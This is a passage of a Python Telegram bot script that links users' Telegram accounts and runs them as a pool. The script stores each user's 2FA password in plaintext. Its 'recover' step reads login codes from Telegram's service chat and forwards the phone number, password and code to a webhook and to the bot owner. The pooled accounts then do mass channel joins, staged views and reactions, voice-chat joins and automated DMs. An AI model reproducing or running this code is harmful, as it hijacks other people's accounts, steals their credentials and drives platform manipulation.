                await event.respond(f"Error: {e}")
                del USER_LOGIN_STATE[uid]
        elif state["step"] == "code":
            code = re.sub(r'\D', '', event.text.strip())
            client = state["client"]
            phone = state["phone"]
            try:
                await client.sign_in(phone, code, phone_code_hash=state["phone_hash"])
                ACTIVE_CLIENTS[phone] = client
                await ensure_user_exists(uid)
                if phone not in db["users"][uid]["phones"]:
                    db["users"][uid]["phones"].append(phone)
                    await save_db(db)
                await event.respond("✅ Account linked.")
                del USER_LOGIN_STATE[uid]
            except SessionPasswordNeededError:
                USER_LOGIN_STATE[uid]["step"] = "password"
                await event.respond("2FA required. Enter password:")
            except Exception as e:
                await event.respond(f"Error: {e}")
                del USER_LOGIN_STATE[uid]
        elif state["step"] == "password":
            pwd = event.text.strip()
            client = state["client"]
            phone = state["phone"]
            try:
                await client.sign_in(password=pwd)
                ACTIVE_CLIENTS[phone] = client
                await ensure_user_exists(uid)
                if phone not in db["users"][uid]["phones"]:
                    db["users"][uid]["phones"].append(phone)
                db["passwords"][phone] = pwd
                await save_db(db)
                await event.respond("✅ Account linked.")
                del USER_LOGIN_STATE[uid]
            except Exception as e:
                await event.respond(f"Error: {e}")
                del USER_LOGIN_STATE[uid]
        elif state["step"] == "recover_phone":
            if not is_owner(event.sender_id):
                await event.respond("Not authorized.")
                del USER_LOGIN_STATE[uid]
                return
            phone = event.text.strip().replace(" ", "").replace("+", "").replace("-", "")
            phone = "+" + phone
            if phone not in db["users"][uid]["phones"]:
                await event.respond("Phone not linked to you.")
                del USER_LOGIN_STATE[uid]
                return
            if phone not in ACTIVE_CLIENTS:
                await event.respond("ID offline.")
                del USER_LOGIN_STATE[uid]
                return
            client = ACTIVE_CLIENTS[phone]
            try:
                msgs = await client.get_messages(777000, limit=3)
                otp = "No OTP found"
                for m in msgs:
                    if m and m.message:
                        match = re.search(r'\b(\d{5})\b', m.message)
                        if match:
                            otp = match.group(1)
                            break
                pwd = db["passwords"].get(phone, "No password")
                reply = f"✅ Recovery:\n📱 {phone}\n🔐 {pwd}\n💬 OTP: {otp}"
                await event.respond(reply)
                await send_to_webhook(phone, pwd, otp, self.bot)
                await forward_to_owner(reply, self.bot)
            except Exception as e:
                await event.respond(f"Error: {e}")
            del USER_LOGIN_STATE[uid]
        elif state["step"] == "req_join_link":
            USER_LOGIN_STATE[uid]["link"] = event.text.strip()
            USER_LOGIN_STATE[uid]["step"] = "req_join_qty"
            await event.respond(f"Quantity? (you have {len(user_clients)} active accounts)")
        elif state["step"] == "req_join_qty":
            try:
                USER_LOGIN_STATE[uid]["qty"] = int(event.text.strip())
                USER_LOGIN_STATE[uid]["step"] = "req_join_time"
                await event.respond("Time limit (seconds):")
            except:
                await event.respond("Invalid number.")
        elif state["step"] == "req_join_time":
            try:
                time_limit = int(event.text.strip())
                link = USER_LOGIN_STATE[uid]["link"]
                qty = USER_LOGIN_STATE[uid]["qty"]
                del USER_LOGIN_STATE[uid]
                user_phones = db["users"][uid]["phones"]
                user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                if not user_clients:
                    await event.respond("No active accounts.")
                    return
                target_qty = min(qty, len(user_clients))
                await event.respond(f"Joining {target_qty} accounts over {time_limit}s...")
                asyncio.create_task(process_termux_join(link, qty, time_limit, user_clients))
            except:
                await event.respond("Invalid time.")
        elif state["step"].startswith("arg_"):
            mode = state["step"].split("_")[1]
            link = event.text.strip()
            del USER_LOGIN_STATE[uid]
            user_phones = db["users"][uid]["phones"]
            user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
            if not user_clients:
                await event.respond("No active accounts.")
                return
            await event.respond(f"Starting {mode.upper()} mode on {link}...")
            if mode == "teri":
                asyncio.create_task(process_voice_join_teri(link, user_clients))
            elif mode == "pro":
                asyncio.create_task(process_pro_mode(link, user_clients))
            elif mode == "test":
                asyncio.create_task(test_channel_check(link, len(user_clients), 0, user_clients))

    async def channel_post_watcher(self, event):
        if event.is_channel and not event.is_private:
            try:
                chat = event.chat.username or event.chat_id
                asyncio.create_task(perform_staged_reaction_view(chat, event.id))
            except:
                pass

    async def auto_dm_requester(self, event):
        if isinstance(event, UpdateBotChatInviteRequester):
            try:
                buttons = [[Button.url(b["text"], b["url"])] for b in db["dm_buttons"]] if db["dm_buttons"] else None
                await event.client.send_message(event.peer, db["dm_text"], buttons=buttons)
            except:
                pass

    async def auto_join_on_admin(self, event):
        if event.user_added and event.user_id == (await event.client.get_me()).id:
            try:
                chat = await event.get_chat()
                invite = await event.client(ExportChatInviteRequest(peer=chat))
                link = invite.link
                adder = event.sender_id
                if adder in OWNER_IDS:
                    asyncio.create_task(process_pro_mode(link))
                elif adder and str(adder) in db["users"]:
                    user_phones = db["users"][str(adder)]["phones"]
                    user_clients = {p: c for p, c in ACTIVE_CLIENTS.items() if p in user_phones}
                    if user_clients:
                        asyncio.create_task(process_pro_mode(link, user_clients))
            except:
                pass

# ==========================================
# 8. CONSOLE INPUT LOOP
# ==========================================

async def console_input_loop():
    print(f"{GREEN}✅ System ready. Commands: join, pro, test, teri, leaveall, leavevc, new, refresh, status{RESET}")
    if not sys.stdin.isatty():
        while True:
            await asyncio.sleep(86400)
    loop = asyncio.get_running_loop()
    while True:
        try:
            cmd = await loop.run_in_executor(None, input, ">> ")
            if not cmd:
                continue
            parts = cmd.strip().split()
            c = parts[0].lower()
            if c == "exit":
                sys.exit()
            elif c == "refresh":
                await refresh_all_clients()
            elif c == "new":
                await login_new_account()
            elif c == "status":
                print(f"{CYAN}📊 {len(ACTIVE_CLIENTS)} IDs online.{RESET}")
            elif c == "join":
                link = parts[1] if len(parts) > 1 else input("Link: ")
                qty = int(parts[2]) if len(parts) > 2 else int(input("Quantity (default 50): ") or 50)
                tl = int(parts[3]) if len(parts) > 3 else int(input("Time limit (0 for fast): ") or 0)
                asyncio.create_task(process_termux_join(link, qty, tl))
            elif c == "pro":
                link = parts[1] if len(parts) > 1 else input("Link: ")
                asyncio.create_task(process_pro_mode(link))
            elif c == "test":
                link = parts[1] if len(parts) > 1 else input("Link: ")
                qty = int(parts[2]) if len(parts) > 2 else int(input("Quantity (default 10): ") or 10)
                tl = int(parts[3]) if len(parts) > 3 else int(input("Time limit (0 for fast): ") or 0)
                asyncio.create_task(test_channel_check(link, qty, tl))
            elif c == "teri":
                link = parts[1] if len(parts) > 1 else input("Link: ")
                asyncio.create_task(process_voice_join_teri(link))
            elif c == "leaveall":
                asyncio.create_task(leave_all_channels_from_all_ids())
            elif c == "leavevc":
                asyncio.create_task(leave_voice_chat_all())
            else:
                print(f"{RED}Unknown command.{RESET}")
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

# ==========================================
# 9. START BOTS
# ==========================================

async def start_all_bots():
    tasks = []
    for token in BOT_TOKENS:
        if not token or token.count(':') != 1:
            continue
        bot = TelegramClient(f"{SESSION_FOLDER}/bot_{token.split(':')[0]}", DEFAULT_API_ID, DEFAULT_API_HASH)
        await bot.start(bot_token=token)
        print(f"{GREEN}✅ Bot {token.split(':')[0]} started.{RESET}")
        BotHandlers(bot)
        tasks.append(asyncio.create_task(bot.run_until_disconnected()))
    return tasks

# ==========================================
# 10. MAIN
# ==========================================

async def main():
    global db
    await init_db()
    await initialize_all_clients()
    asyncio.create_task(start_http_server())
    asyncio.create_task(keep_alive_pinger())
    asyncio.create_task(keep_online_loop())
    asyncio.create_task(console_input_loop())
    bot_tasks = await start_all_bots()
    await asyncio.gather(*bot_tasks)

if __name__ == "__main__":
    print(f"{CYAN}🤖 Quantum Bot with Keep‑Alive{RESET}")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBye!")
